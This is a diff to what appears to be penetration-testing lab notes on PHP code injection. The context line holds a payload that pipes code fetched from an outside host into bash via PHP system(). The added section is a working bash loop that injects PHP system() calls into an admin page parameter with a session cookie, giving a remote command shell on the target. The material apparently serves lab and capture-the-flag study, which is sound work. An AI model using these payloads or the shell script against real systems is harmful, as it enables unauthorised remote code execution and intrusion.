@@ -68,3 +68,35 @@ Inject a malicious PHP code:
 <?php system("curl 10.10.14.28 | bash"); ?>
 ```
 
+### Fake Shell via Continous PHP Injection
+
+The following code enters in a while loop to execute the commands and we use **read** to parse the output:
+
+```bash
+#!/bin/bash
+
+function ctrl_c(){
+    echo -e "\n\n[!] Saliendo...\n"
+    exit 1
+}
+
+# Ctrl+C
+trap ctrl_c INT
+
+# Variables globales
+main_url="http://10.10.10.27/admin.php"
+
+while true; do
+    echo -n "[~] " && read -r command
+    echo; curl -s -G $main_url --data-urlencode "html=<?php system(\"$command\"); ?>" --cookie "adminpowa=noonecares" | grep "\/body" -A 500 | grep -v "\/body"; echo
+done
+```
+
+The script above was made by S4vitar.
+
+Things to keep in mind:
+
+* Cookie = You don't need a cookie if you don't have to be authenticated.
+* -G = This sends a GET request and the content in the URL.
+* grep = If you don't need to filter the output, then you may remove the grep commands.
+
